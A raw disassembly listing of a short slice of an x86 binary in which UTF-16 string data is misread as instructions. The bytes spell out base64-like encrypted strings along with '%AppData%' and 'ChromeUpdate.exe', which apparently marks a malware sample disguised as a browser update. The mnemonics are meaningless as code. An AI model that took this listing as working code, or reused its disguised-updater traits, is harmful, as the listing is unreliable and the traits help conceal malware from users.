  409e10:	52                   	push   %edx
  409e11:	00 51 00             	add    %dl,0x0(%ecx)
  409e14:	7a 00                	jp     0x409e16
  409e16:	62 00                	bound  %eax,(%eax)
  409e18:	4a                   	dec    %edx
  409e19:	00 68 00             	add    %ch,0x0(%eax)
  409e1c:	77 00                	ja     0x409e1e
  409e1e:	49                   	dec    %ecx
  409e1f:	00 66 00             	add    %ah,0x0(%esi)
  409e22:	66 00 2f             	data16 add %ch,(%edi)
  409e25:	00 53 00             	add    %dl,0x0(%ebx)
  409e28:	53                   	push   %ebx
  409e29:	00 47 00             	add    %al,0x0(%edi)
  409e2c:	74 00                	je     0x409e2e
  409e2e:	73 00                	jae    0x409e30
  409e30:	2b 00                	sub    (%eax),%eax
  409e32:	68 00 58 00 58       	push   $0x58005800
  409e37:	00 4f 00             	add    %cl,0x0(%edi)
  409e3a:	62 00                	bound  %eax,(%eax)
  409e3c:	57                   	push   %edi
  409e3d:	00 4a 00             	add    %cl,0x0(%edx)
  409e40:	76 00                	jbe    0x409e42
  409e42:	64 00 54 00 68       	add    %dl,%fs:0x68(%eax,%eax,1)
  409e47:	00 6e 00             	add    %ch,0x0(%esi)
  409e4a:	4e                   	dec    %esi
  409e4b:	00 73 00             	add    %dh,0x0(%ebx)
  409e4e:	46                   	inc    %esi
  409e4f:	00 35 00 77 00 52    	add    %dh,0x52007700
  409e55:	00 76 00             	add    %dh,0x0(%esi)
  409e58:	48                   	dec    %eax
  409e59:	00 6a 00             	add    %ch,0x0(%edx)
  409e5c:	66 00 36             	data16 add %dh,(%esi)
  409e5f:	00 4e 00             	add    %cl,0x0(%esi)
  409e62:	43                   	inc    %ebx
  409e63:	00 51 00             	add    %dl,0x0(%ecx)
  409e66:	63 00                	arpl   %eax,(%eax)
  409e68:	44                   	inc    %esp
  409e69:	00 4f 00             	add    %cl,0x0(%edi)
  409e6c:	74 00                	je     0x409e6e
  409e6e:	42                   	inc    %edx
  409e6f:	00 49 00             	add    %cl,0x0(%ecx)
  409e72:	53                   	push   %ebx
  409e73:	00 67 00             	add    %ah,0x0(%edi)
  409e76:	52                   	push   %edx
  409e77:	00 74 00 47          	add    %dh,0x47(%eax,%eax,1)
  409e7b:	00 63 00             	add    %ah,0x0(%ebx)
  409e7e:	63 00                	arpl   %eax,(%eax)
  409e80:	51                   	push   %ecx
  409e81:	00 4f 00             	add    %cl,0x0(%edi)
  409e84:	69 00 73 00 41 00    	imul   $0x410073,(%eax),%eax
  409e8a:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  409e8f:	13 25 00 41 00 70    	adc    0x70004100,%esp
  409e95:	00 70 00             	add    %dh,0x0(%eax)
  409e98:	44                   	inc    %esp
  409e99:	00 61 00             	add    %ah,0x0(%ecx)
  409e9c:	74 00                	je     0x409e9e
  409e9e:	61                   	popa
  409e9f:	00 25 00 00 21 43    	add    %ah,0x43210000
  409ea5:	00 68 00             	add    %ch,0x0(%eax)
  409ea8:	72 00                	jb     0x409eaa
  409eaa:	6f                   	outsl  %ds:(%esi),(%dx)
  409eab:	00 6d 00             	add    %ch,0x0(%ebp)
  409eae:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
  409eb2:	70 00                	jo     0x409eb4
  409eb4:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409eb8:	74 00                	je     0x409eba
  409eba:	65 00 2e             	add    %ch,%gs:(%esi)
  409ebd:	00 65 00             	add    %ah,0x0(%ebp)
  409ec0:	78 00                	js     0x409ec2
  409ec2:	65 00 00             	add    %al,%gs:(%eax)
  409ec5:	59                   	pop    %ecx
  409ec6:	56                   	push   %esi
  409ec7:	00 54 00 56          	add    %dl,0x56(%eax,%eax,1)
  409ecb:	00 31                	add    %dh,(%ecx)
  409ecd:	00 62 00             	add    %ah,0x0(%edx)
  409ed0:	47                   	inc    %edi
  409ed1:	00 78 00             	add    %bh,0x0(%eax)
  409ed4:	72 00                	jb     0x409ed6
  409ed6:	63 00                	arpl   %eax,(%eax)
  409ed8:	48                   	dec    %eax
  409ed9:	00 68 00             	add    %ch,0x0(%eax)
  409edc:	7a 00                	jp     0x409ede
  409ede:	56                   	push   %esi
  409edf:	00 6a 00             	add    %ch,0x0(%edx)
  409ee2:	45                   	inc    %ebp
  409ee3:	00 34 00             	add    %dh,(%eax,%eax,1)
  409ee6:	57                   	push   %edi
  409ee7:	00 55 00             	add    %dl,0x0(%ebp)
  409eea:	56                   	push   %esi
  409eeb:	00 31                	add    %dh,(%ecx)
  409eed:	00 62 00             	add    %ah,0x0(%edx)
  409ef0:	6c                   	insb   (%dx),%es:(%edi)
  409ef1:	00 4e 00             	add    %cl,0x0(%esi)
  409ef4:	4a                   	dec    %edx
  409ef5:	00 4f 00             	add    %cl,0x0(%edi)
  409ef8:	54                   	push   %esp
  409ef9:	00 5a 00             	add    %bl,0x0(%edx)
  409efc:	78 00                	js     0x409efe
  409efe:	61                   	popa
  409eff:	00 6d 00             	add    %ch,0x0(%ebp)
  409f02:	52                   	push   %edx
  409f03:	00 4c 00 53          	add    %cl,0x53(%eax,%eax,1)
  409f07:	00 57 00             	add    %dl,0x0(%edi)
  409f0a:	70 00                	jo     0x409f0c
  409f0c:	32 00                	xor    (%eax),%al
  409f0e:	59                   	pop    %ecx
  409f0f:	00 6d 00             	add    %ch,0x0(%ebp)
  409f12:	31 00                	xor    %eax,(%eax)
  409f14:	77 00                	ja     0x409f16
  409f16:	61                   	popa
  409f17:	00 46 00             	add    %al,0x0(%esi)
  409f1a:	49                   	dec    %ecx
  409f1b:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  409f21:	58                   	pop    %eax
  409f22:	00 33                	add    %dh,(%ebx)
  409f24:	00 66 00             	add    %ah,0x0(%esi)
  409f27:	32 00                	xor    (%eax),%al
  409f29:	6c                   	insb   (%dx),%es:(%edi)
  409f2a:	00 78 00             	add    %bh,0x0(%eax)
  409f2d:	6f                   	outsl  %ds:(%esi),(%dx)
  409f2e:	00 75 00             	add    %dh,0x0(%ebp)
  409f31:	56                   	push   %esi
  409f32:	00 79 00             	add    %bh,0x0(%ecx)
  409f35:	6f                   	outsl  %ds:(%esi),(%dx)
  409f36:	00 61 00             	add    %ah,0x0(%ecx)
  409f39:	50                   	push   %eax
  409f3a:	00 62 00             	add    %ah,0x0(%edx)
  409f3d:	55                   	push   %ebp
  409f3e:	00 77 00             	add    %dh,0x0(%edi)
  409f41:	53                   	push   %ebx
  409f42:	00 58 00             	add    %bl,0x0(%eax)
  409f45:	31 00                	xor    %eax,(%eax)
  409f47:	6d                   	insl   (%dx),%es:(%edi)
  409f48:	00 79 00             	add    %bh,0x0(%ecx)
  409f4b:	71 00                	jno    0x409f4d
  409f4d:	5a                   	pop    %edx
  409f4e:	00 6e 00             	add    %ch,0x0(%esi)
  409f51:	67 00 5a 00          	add    %bl,0x0(%bp,%si)
  409f55:	62 00                	bound  %eax,(%eax)
  409f57:	58                   	pop    %eax
  409f58:	00 6c 00 35          	add    %ch,0x35(%eax,%eax,1)
  409f5c:	00 78 00             	add    %bh,0x0(%eax)
  409f5f:	74 00                	je     0x409f61
  409f61:	4b                   	dec    %ebx
  409f62:	00 41 00             	add    %al,0x0(%ecx)
  409f65:	42                   	inc    %edx
  409f66:	00 51 00             	add    %dl,0x0(%ecx)
  409f69:	54                   	push   %esp
  409f6a:	00 64 00 31          	add    %ah,0x31(%eax,%eax,1)
  409f6e:	00 75 00             	add    %dh,0x0(%ebp)
  409f71:	39 00                	cmp    %eax,(%eax)
  409f73:	76 00                	jbe    0x409f75
  409f75:	63 00                	arpl   %eax,(%eax)
  409f77:	6a 00                	push   $0x0
  409f79:	35 00 79 00 70       	xor    $0x70007900,%eax
  409f7e:	00 42 00             	add    %al,0x0(%edx)
  409f81:	31 00                	xor    %eax,(%eax)
  409f83:	59                   	pop    %ecx
  409f84:	00 43 00             	add    %al,0x0(%ebx)
  409f87:	65 00 6f 00          	add    %ch,%gs:0x0(%edi)
  409f8b:	79 00                	jns    0x409f8d
  409f8d:	64 00 39             	add    %bh,%fs:(%ecx)
  409f90:	00 5a 00             	add    %bl,0x0(%edx)
  409f93:	53                   	push   %ebx
  409f94:	00 38                	add    %bh,(%eax)
  409f96:	00 61 00             	add    %ah,0x0(%ecx)
  409f99:	69 00 59 00 45 00    	imul   $0x450059,(%eax),%eax
  409f9f:	32 00                	xor    (%eax),%al
  409fa1:	42                   	inc    %edx
  409fa2:	00 58 00             	add    %bl,0x0(%eax)
  409fa5:	7a 00                	jp     0x409fa7
  409fa7:	6a 00                	push   $0x0
  409fa9:	7a 00                	jp     0x409fab
  409fab:	4e                   	dec    %esi
  409fac:	00 66 00             	add    %ah,0x0(%esi)
  409faf:	36 00 56 00          	add    %dl,%ss:0x0(%esi)
  409fb3:	57                   	push   %edi
  409fb4:	00 50 00             	add    %dl,0x0(%eax)
  409fb7:	4b                   	dec    %ebx
  409fb8:	00 67 00             	add    %ah,0x0(%edi)
  409fbb:	74 00                	je     0x409fbd
  409fbd:	50                   	push   %eax
  409fbe:	00 52 00             	add    %dl,0x0(%edx)
  409fc1:	68 00 6e 00 38       	push   $0x38006e00
  409fc6:	00 68 00             	add    %ch,0x0(%eax)
  409fc9:	69 00 41 00 3d 00    	imul   $0x3d0041,(%eax),%eax
  409fcf:	3d 00 00 92 59       	cmp    $0x59920000,%eax
  409fd4:	34 00                	xor    $0x0,%al
  409fd6:	31 00                	xor    %eax,(%eax)
  409fd8:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
  409fdc:	5a                   	pop    %edx
  409fdd:	00 33                	add    %dh,(%ebx)
  409fdf:	00 4e 00             	add    %cl,0x0(%esi)
  409fe2:	34 00                	xor    $0x0,%al
  409fe4:	4f                   	dec    %edi
  409fe5:	00 38                	add    %bh,(%eax)
  409fe7:	00 75 00             	add    %dh,0x0(%ebp)
  409fea:	37                   	aaa
  409feb:	00 51 00             	add    %dl,0x0(%ecx)
  409fee:	4a                   	dec    %edx
  409fef:	00 77 00             	add    %dh,0x0(%edi)
  409ff2:	77 00                	ja     0x409ff4
  409ff4:	36 00 65 00          	add    %ah,%ss:0x0(%ebp)
  409ff8:	34 00                	xor    $0x0,%al
  409ffa:	46                   	inc    %esi
  409ffb:	00 47 00             	add    %al,0x0(%edi)
  409ffe:	68 00 55 00 4a       	push   $0x4a005500
  40a003:	00 30                	add    %dh,(%eax)
  40a005:	00 71 00             	add    %dh,0x0(%ecx)
  40a008:	30 00                	xor    %al,(%eax)
  40a00a:	77 00                	ja     0x40a00c
  40a00c:	63 00                	arpl   %eax,(%eax)
  40a00e:	64 00 74 00 32       	add    %dh,%fs:0x32(%eax,%eax,1)
  40a013:	00 6f 00             	add    %ch,0x0(%edi)
  40a016:	6e                   	outsb  %ds:(%esi),(%dx)
  40a017:	00 66 00             	add    %ah,0x0(%esi)
  40a01a:	6d                   	insl   (%dx),%es:(%edi)
  40a01b:	00 48 00             	add    %cl,0x0(%eax)
  40a01e:	5a                   	pop    %edx
  40a01f:	00 66 00             	add    %ah,0x0(%esi)
  40a022:	69 00 68 00 77 00    	imul   $0x770068,(%eax),%eax
  40a028:	32 00                	xor    (%eax),%al
  40a02a:	31 00                	xor    %eax,(%eax)
  40a02c:	68 00 47 00 75       	push   $0x75004700
  40a031:	00 6c 00 34          	add    %ch,0x34(%eax,%eax,1)
  40a035:	00 66 00             	add    %ah,0x0(%esi)
  40a038:	37                   	aaa
  40a039:	00 72 00             	add    %dh,0x0(%edx)
  40a03c:	63 00                	arpl   %eax,(%eax)
  40a03e:	77 00                	ja     0x40a040
  40a040:	4c                   	dec    %esp
  40a041:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  40a045:	00 52 00             	add    %dl,0x0(%edx)
  40a048:	48                   	dec    %eax
  40a049:	00 42 00             	add    %al,0x0(%edx)
  40a04c:	43                   	inc    %ebx
  40a04d:	00 6f 00             	add    %ch,0x0(%edi)
  40a050:	33 00                	xor    (%eax),%eax
  40a052:	5a                   	pop    %edx
  40a053:	00 43 00             	add    %al,0x0(%ebx)
  40a056:	4f                   	dec    %edi
  40a057:	00 76 00             	add    %dh,0x0(%esi)
  40a05a:	36 00 43 00          	add    %al,%ss:0x0(%ebx)
  40a05e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a05f:	00 7a 00             	add    %bh,0x0(%edx)
  40a062:	46                   	inc    %esi
  40a063:	00 2b                	add    %ch,(%ebx)
  40a065:	00 67 00             	add    %ah,0x0(%edi)
  40a068:	6e                   	outsb  %ds:(%esi),(%dx)
  40a069:	00 78 00             	add    %bh,0x0(%eax)
  40a06c:	47                   	inc    %edi
  40a06d:	00 59 00             	add    %bl,0x0(%ecx)
  40a070:	4f                   	dec    %edi
  40a071:	00 57 00             	add    %dl,0x0(%edi)
  40a074:	34 00                	xor    $0x0,%al
  40a076:	33 00                	xor    (%eax),%eax
  40a078:	72 00                	jb     0x40a07a
  40a07a:	41                   	inc    %ecx
  40a07b:	00 30                	add    %dh,(%eax)
  40a07d:	00 6b 00             	add    %ch,0x0(%ebx)
  40a080:	78 00                	js     0x40a082
  40a082:	52                   	push   %edx
  40a083:	00 52 00             	add    %dl,0x0(%edx)
  40a086:	49                   	dec    %ecx
  40a087:	00 75 00             	add    %dh,0x0(%ebp)
  40a08a:	62 00                	bound  %eax,(%eax)
  40a08c:	4a                   	dec    %edx
  40a08d:	00 33                	add    %dh,(%ebx)
  40a08f:	00 52 00             	add    %dl,0x0(%edx)
  40a092:	42                   	inc    %edx
  40a093:	00 69 00             	add    %ch,0x0(%ecx)
  40a096:	50                   	push   %eax
  40a097:	00 47 00             	add    %al,0x0(%edi)
  40a09a:	30 00                	xor    %al,(%eax)
  40a09c:	43                   	inc    %ebx
  40a09d:	00 51 00             	add    %dl,0x0(%ecx)
  40a0a0:	33 00                	xor    (%eax),%eax
  40a0a2:	6b 00 7a             	imul   $0x7a,(%eax),%eax
  40a0a5:	00 70 00             	add    %dh,0x0(%eax)
  40a0a8:	46                   	inc    %esi
  40a0a9:	00 52 00             	add    %dl,0x0(%edx)
  40a0ac:	55                   	push   %ebp
  40a0ad:	00 2b                	add    %ch,(%ebx)
  40a0af:	00 39                	add    %bh,(%ecx)
  40a0b1:	00 63 00             	add    %ah,0x0(%ebx)
  40a0b4:	5a                   	pop    %edx
  40a0b5:	00 37                	add    %dh,(%edi)
  40a0b7:	00 43 00             	add    %al,0x0(%ebx)
  40a0ba:	50                   	push   %eax
  40a0bb:	00 4c 00 72          	add    %cl,0x72(%eax,%eax,1)
  40a0bf:	00 6d 00             	add    %ch,0x0(%ebp)
  40a0c2:	73 00                	jae    0x40a0c4
  40a0c4:	53                   	push   %ebx
  40a0c5:	00 72 00             	add    %dh,0x0(%edx)
  40a0c8:	77 00                	ja     0x40a0ca
  40a0ca:	37                   	aaa
  40a0cb:	00 42 00             	add    %al,0x0(%edx)
  40a0ce:	65 00 34 00          	add    %dh,%gs:(%eax,%eax,1)
  40a0d2:	77 00                	ja     0x40a0d4
  40a0d4:	41                   	inc    %ecx
  40a0d5:	00 64 00 34          	add    %ah,0x34(%eax,%eax,1)
  40a0d9:	00 75 00             	add    %dh,0x0(%ebp)
  40a0dc:	79 00                	jns    0x40a0de
  40a0de:	51                   	push   %ecx
  40a0df:	00 4e 00             	add    %cl,0x0(%esi)
  40a0e2:	46                   	inc    %esi
  40a0e3:	00 37                	add    %dh,(%edi)
  40a0e5:	00 63 00             	add    %ah,0x0(%ebx)
  40a0e8:	76 00                	jbe    0x40a0ea
  40a0ea:	75 00                	jne    0x40a0ec
  40a0ec:	54                   	push   %esp
  40a0ed:	00 6c 00 4b          	add    %ch,0x4b(%eax,%eax,1)
  40a0f1:	00 49 00             	add    %cl,0x0(%ecx)
  40a0f4:	67 00 47 00          	add    %al,0x0(%bx)
  40a0f8:	74 00                	je     0x40a0fa
  40a0fa:	30 00                	xor    %al,(%eax)
  40a0fc:	62 00                	bound  %eax,(%eax)
  40a0fe:	4b                   	dec    %ebx
  40a0ff:	00 4e 00             	add    %cl,0x0(%esi)
  40a102:	4f                   	dec    %edi
  40a103:	00 4f 00             	add    %cl,0x0(%edi)
  40a106:	79 00                	jns    0x40a108
  40a108:	4a                   	dec    %edx
  40a109:	00 35 00 6a 00 66    	add    %dh,0x66006a00
  40a10f:	00 56 00             	add    %dl,0x0(%esi)
  40a112:	38 00                	cmp    %al,(%eax)
  40a114:	56                   	push   %esi
  40a115:	00 39                	add    %bh,(%ecx)
  40a117:	00 37                	add    %dh,(%edi)
  40a119:	00 76 00             	add    %dh,0x0(%esi)
  40a11c:	66 00 49 00          	data16 add %cl,0x0(%ecx)
  40a120:	58                   	pop    %eax
  40a121:	00 51 00             	add    %dl,0x0(%ecx)
  40a124:	4c                   	dec    %esp
  40a125:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
  40a129:	00 39                	add    %bh,(%ecx)
  40a12b:	00 45 00             	add    %al,0x0(%ebp)
  40a12e:	32 00                	xor    (%eax),%al
  40a130:	44                   	inc    %esp
  40a131:	00 31                	add    %dh,(%ecx)
  40a133:	00 72 00             	add    %dh,0x0(%edx)
  40a136:	75 00                	jne    0x40a138
  40a138:	69 00 79 00 4a 00    	imul   $0x4a0079,(%eax),%eax
  40a13e:	67 00 30             	add    %dh,(%bx,%si)
  40a141:	00 6a 00             	add    %ch,0x0(%edx)
  40a144:	54                   	push   %esp
  40a145:	00 6e 00             	add    %ch,0x0(%esi)
  40a148:	74 00                	je     0x40a14a
  40a14a:	37                   	aaa
  40a14b:	00 4c 00 39          	add    %cl,0x39(%eax,%eax,1)
  40a14f:	00 6a 00             	add    %ch,0x0(%edx)
  40a152:	31 00                	xor    %eax,(%eax)
  40a154:	44                   	inc    %esp
  40a155:	00 6a 00             	add    %ch,0x0(%edx)
  40a158:	79 00                	jns    0x40a15a
  40a15a:	76 00                	jbe    0x40a15c
  40a15c:	66 00 42 00          	data16 add %al,0x0(%edx)
  40a160:	58                   	pop    %eax
  40a161:	00 37                	add    %dh,(%edi)
  40a163:	00 56 00             	add    %dl,0x0(%esi)
  40a166:	50                   	push   %eax
  40a167:	00 4d 00             	add    %cl,0x0(%ebp)
  40a16a:	35 00 76 00 62       	xor    $0x62007600,%eax
  40a16f:	00 4c 00 34          	add    %cl,0x34(%eax,%eax,1)
  40a173:	00 61 00             	add    %ah,0x0(%ecx)
  40a176:	50                   	push   %eax
  40a177:	00 65 00             	add    %ah,0x0(%ebp)
  40a17a:	41                   	inc    %ecx
  40a17b:	00 49 00             	add    %cl,0x0(%ecx)
  40a17e:	7a 00                	jp     0x40a180
  40a180:	33 00                	xor    (%eax),%eax
  40a182:	42                   	inc    %edx
  40a183:	00 36                	add    %dh,(%esi)
  40a185:	00 73 00             	add    %dh,0x0(%ebx)
  40a188:	4e                   	dec    %esi
  40a189:	00 45 00             	add    %al,0x0(%ebp)
  40a18c:	51                   	push   %ecx
  40a18d:	00 4c 00 39          	add    %cl,0x39(%eax,%eax,1)
  40a191:	00 58 00             	add    %bl,0x0(%eax)
  40a194:	71 00                	jno    0x40a196
  40a196:	73 00                	jae    0x40a198
  40a198:	4e                   	dec    %esi
  40a199:	00 32                	add    %dh,(%edx)
  40a19b:	00 58 00             	add    %bl,0x0(%eax)
  40a19e:	4a                   	dec    %edx
  40a19f:	00 58 00             	add    %bl,0x0(%eax)
  40a1a2:	67 00 76 00          	add    %dh,0x0(%bp)
  40a1a6:	43                   	inc    %ebx
  40a1a7:	00 58 00             	add    %bl,0x0(%eax)
  40a1aa:	49                   	dec    %ecx
  40a1ab:	00 62 00             	add    %ah,0x0(%edx)
  40a1ae:	78 00                	js     0x40a1b0
  40a1b0:	48                   	dec    %eax
  40a1b1:	00 6f 00             	add    %ch,0x0(%edi)
  40a1b4:	55                   	push   %ebp
  40a1b5:	00 4d 00             	add    %cl,0x0(%ebp)
  40a1b8:	38 00                	cmp    %al,(%eax)
  40a1ba:	41                   	inc    %ecx
  40a1bb:	00 43 00             	add    %al,0x0(%ebx)
  40a1be:	75 00                	jne    0x40a1c0
  40a1c0:	51                   	push   %ecx
  40a1c1:	00 50 00             	add    %dl,0x0(%eax)
  40a1c4:	71 00                	jno    0x40a1c6
  40a1c6:	39 00                	cmp    %eax,(%eax)
  40a1c8:	4f                   	dec    %edi
  40a1c9:	00 77 00             	add    %dh,0x0(%edi)
  40a1cc:	70 00                	jo     0x40a1ce
  40a1ce:	35 00 2f 00 6c       	xor    $0x6c002f00,%eax
  40a1d3:	00 69 00             	add    %ch,0x0(%ecx)
  40a1d6:	51                   	push   %ecx
  40a1d7:	00 68 00             	add    %ch,0x0(%eax)
  40a1da:	76 00                	jbe    0x40a1dc
  40a1dc:	7a 00                	jp     0x40a1de
  40a1de:	43                   	inc    %ebx
  40a1df:	00 4b 00             	add    %cl,0x0(%ebx)
  40a1e2:	39 00                	cmp    %eax,(%eax)
  40a1e4:	63 00                	arpl   %eax,(%eax)
  40a1e6:	61                   	popa
  40a1e7:	00 5a 00             	add    %bl,0x0(%edx)
  40a1ea:	71 00                	jno    0x40a1ec
  40a1ec:	32 00                	xor    (%eax),%al
  40a1ee:	6a 00                	push   $0x0
  40a1f0:	66 00 48 00          	data16 add %cl,0x0(%eax)
  40a1f4:	55                   	push   %ebp
  40a1f5:	00 4d 00             	add    %cl,0x0(%ebp)
  40a1f8:	43                   	inc    %ebx
  40a1f9:	00 35 00 54 00 67    	add    %dh,0x67005400
  40a1ff:	00 6f 00             	add    %ch,0x0(%edi)
  40a202:	49                   	dec    %ecx
  40a203:	00 7a 00             	add    %bh,0x0(%edx)
  40a206:	49                   	dec    %ecx
  40a207:	00 75 00             	add    %dh,0x0(%ebp)
  40a20a:	76 00                	jbe    0x40a20c
  40a20c:	2b 00                	sub    (%eax),%eax
  40a20e:	5a                   	pop    %edx
  40a20f:	00 47 00             	add    %al,0x0(%edi)
  40a212:	30 00                	xor    %al,(%eax)
  40a214:	38 00                	cmp    %al,(%eax)
  40a216:	37                   	aaa
  40a217:	00 51 00             	add    %dl,0x0(%ecx)
  40a21a:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  40a21e:	37                   	aaa
  40a21f:	00 58 00             	add    %bl,0x0(%eax)
  40a222:	6d                   	insl   (%dx),%es:(%edi)
  40a223:	00 6f 00             	add    %ch,0x0(%edi)
  40a226:	4a                   	dec    %edx
  40a227:	00 38                	add    %bh,(%eax)
  40a229:	00 63 00             	add    %ah,0x0(%ebx)
  40a22c:	76 00                	jbe    0x40a22e
  40a22e:	56                   	push   %esi
  40a22f:	00 4f 00             	add    %cl,0x0(%edi)
  40a232:	46                   	inc    %esi
  40a233:	00 64 00 74          	add    %ah,0x74(%eax,%eax,1)
  40a237:	00 7a 00             	add    %bh,0x0(%edx)
  40a23a:	55                   	push   %ebp
  40a23b:	00 4b 00             	add    %cl,0x0(%ebx)
  40a23e:	4e                   	dec    %esi
  40a23f:	00 70 00             	add    %dh,0x0(%eax)
  40a242:	61                   	popa
  40a243:	00 7a 00             	add    %bh,0x0(%edx)
  40a246:	71 00                	jno    0x40a248
  40a248:	4d                   	dec    %ebp
  40a249:	00 70 00             	add    %dh,0x0(%eax)
  40a24c:	46                   	inc    %esi
  40a24d:	00 71 00             	add    %dh,0x0(%ecx)
  40a250:	4e                   	dec    %esi
  40a251:	00 46 00             	add    %al,0x0(%esi)
  40a254:	79 00                	jns    0x40a256
  40a256:	73 00                	jae    0x40a258
  40a258:	6f                   	outsl  %ds:(%esi),(%dx)
  40a259:	00 71 00             	add    %dh,0x0(%ecx)
  40a25c:	6a 00                	push   $0x0
  40a25e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a25f:	00 48 00             	add    %cl,0x0(%eax)
  40a262:	36 00 72 00          	add    %dh,%ss:0x0(%edx)
  40a266:	53                   	push   %ebx
  40a267:	00 45 00             	add    %al,0x0(%ebp)
  40a26a:	34 00                	xor    $0x0,%al
  40a26c:	6b 00 70             	imul   $0x70,(%eax),%eax
  40a26f:	00 73 00             	add    %dh,0x0(%ebx)
  40a272:	31 00                	xor    %eax,(%eax)
  40a274:	68 00 67 00 76       	push   $0x76006700
  40a279:	00 78 00             	add    %bh,0x0(%eax)
  40a27c:	7a 00                	jp     0x40a27e
  40a27e:	67 00 75 00          	add    %dh,0x0(%di)
  40a282:	37                   	aaa
  40a283:	00 77 00             	add    %dh,0x0(%edi)
  40a286:	6e                   	outsb  %ds:(%esi),(%dx)
  40a287:	00 31                	add    %dh,(%ecx)
  40a289:	00 2f                	add    %ch,(%edi)
  40a28b:	00 47 00             	add    %al,0x0(%edi)
  40a28e:	73 00                	jae    0x40a290
  40a290:	4d                   	dec    %ebp
  40a291:	00 35 00 2b 00 75    	add    %dh,0x75002b00
  40a297:	00 63 00             	add    %ah,0x0(%ebx)
  40a29a:	68 00 55 00 75       	push   $0x75005500
  40a29f:	00 59 00             	add    %bl,0x0(%ecx)
  40a2a2:	76 00                	jbe    0x40a2a4
  40a2a4:	52                   	push   %edx
  40a2a5:	00 73 00             	add    %dh,0x0(%ebx)
  40a2a8:	42                   	inc    %edx
  40a2a9:	00 77 00             	add    %dh,0x0(%edi)
  40a2ac:	77 00                	ja     0x40a2ae
  40a2ae:	34 00                	xor    $0x0,%al
  40a2b0:	73 00                	jae    0x40a2b2
  40a2b2:	73 00                	jae    0x40a2b4
  40a2b4:	30 00                	xor    %al,(%eax)
  40a2b6:	6b 00 54             	imul   $0x54,(%eax),%eax
  40a2b9:	00 41 00             	add    %al,0x0(%ecx)
  40a2bc:	61                   	popa
  40a2bd:	00 77 00             	add    %dh,0x0(%edi)
  40a2c0:	68 00 64 00 57       	push   $0x57006400
  40a2c5:	00 66 00             	add    %ah,0x0(%esi)
  40a2c8:	58                   	pop    %eax
  40a2c9:	00 6d 00             	add    %ch,0x0(%ebp)
  40a2cc:	77 00                	ja     0x40a2ce
  40a2ce:	69 00 55 00 67 00    	imul   $0x670055,(%eax),%eax
  40a2d4:	56                   	push   %esi
  40a2d5:	00 5a 00             	add    %bl,0x0(%edx)
  40a2d8:	57                   	push   %edi
  40a2d9:	00 50 00             	add    %dl,0x0(%eax)
  40a2dc:	42                   	inc    %edx
  40a2dd:	00 4d 00             	add    %cl,0x0(%ebp)
  40a2e0:	52                   	push   %edx
  40a2e1:	00 6e 00             	add    %ch,0x0(%esi)
  40a2e4:	64 00 38             	add    %bh,%fs:(%eax)
  40a2e7:	00 6c 00 46          	add    %ch,0x46(%eax,%eax,1)
  40a2eb:	00 65 00             	add    %ah,0x0(%ebp)
  40a2ee:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  40a2f2:	49                   	dec    %ecx
  40a2f3:	00 41 00             	add    %al,0x0(%ecx)
  40a2f6:	73 00                	jae    0x40a2f8
  40a2f8:	4c                   	dec    %esp
  40a2f9:	00 57 00             	add    %dl,0x0(%edi)
  40a2fc:	73 00                	jae    0x40a2fe
  40a2fe:	6b 00 52             	imul   $0x52,(%eax),%eax
  40a301:	00 6e 00             	add    %ch,0x0(%esi)
  40a304:	73 00                	jae    0x40a306
  40a306:	61                   	popa
  40a307:	00 75 00             	add    %dh,0x0(%ebp)
  40a30a:	42                   	inc    %edx
  40a30b:	00 57 00             	add    %dl,0x0(%edi)
  40a30e:	37                   	aaa
  40a30f:	00 55 00             	add    %dl,0x0(%ebp)
  40a312:	4e                   	dec    %esi
  40a313:	00 54 00 39          	add    %dl,0x39(%eax,%eax,1)
  40a317:	00 78 00             	add    %bh,0x0(%eax)
  40a31a:	69 00 52 00 66 00    	imul   $0x660052,(%eax),%eax
  40a320:	4d                   	dec    %ebp
  40a321:	00 59 00             	add    %bl,0x0(%ecx)
  40a324:	44                   	inc    %esp
  40a325:	00 59 00             	add    %bl,0x0(%ecx)
  40a328:	58                   	pop    %eax
  40a329:	00 33                	add    %dh,(%ebx)
  40a32b:	00 68 00             	add    %ch,0x0(%eax)
  40a32e:	42                   	inc    %edx
  40a32f:	00 64 00 6a          	add    %ah,0x6a(%eax,%eax,1)
  40a333:	00 6f 00             	add    %ch,0x0(%edi)
  40a336:	36 00 59 00          	add    %bl,%ss:0x0(%ecx)
  40a33a:	4b                   	dec    %ebx
  40a33b:	00 55 00             	add    %dl,0x0(%ebp)
  40a33e:	52                   	push   %edx
  40a33f:	00 75 00             	add    %dh,0x0(%ebp)
  40a342:	7a 00                	jp     0x40a344
  40a344:	6c                   	insb   (%dx),%es:(%edi)
  40a345:	00 49 00             	add    %cl,0x0(%ecx)
  40a348:	35 00 68 00 53       	xor    $0x53006800,%eax
  40a34d:	00 39                	add    %bh,(%ecx)
  40a34f:	00 64 00 67          	add    %ah,0x67(%eax,%eax,1)
  40a353:	00 4b 00             	add    %cl,0x0(%ebx)
  40a356:	39 00                	cmp    %eax,(%eax)
  40a358:	2b 00                	sub    (%eax),%eax
  40a35a:	6a 00                	push   $0x0
  40a35c:	6f                   	outsl  %ds:(%esi),(%dx)
  40a35d:	00 6a 00             	add    %ch,0x0(%edx)
  40a360:	6a 00                	push   $0x0
  40a362:	72 00                	jb     0x40a364
  40a364:	53                   	push   %ebx
  40a365:	00 55 00             	add    %dl,0x0(%ebp)
  40a368:	38 00                	cmp    %al,(%eax)
  40a36a:	51                   	push   %ecx
  40a36b:	00 50 00             	add    %dl,0x0(%eax)
  40a36e:	38 00                	cmp    %al,(%eax)
  40a370:	41                   	inc    %ecx
  40a371:	00 53 00             	add    %dl,0x0(%ebx)
  40a374:	38 00                	cmp    %al,(%eax)
  40a376:	4f                   	dec    %edi
  40a377:	00 5a 00             	add    %bl,0x0(%edx)
  40a37a:	5a                   	pop    %edx
  40a37b:	00 69 00             	add    %ch,0x0(%ecx)
  40a37e:	48                   	dec    %eax
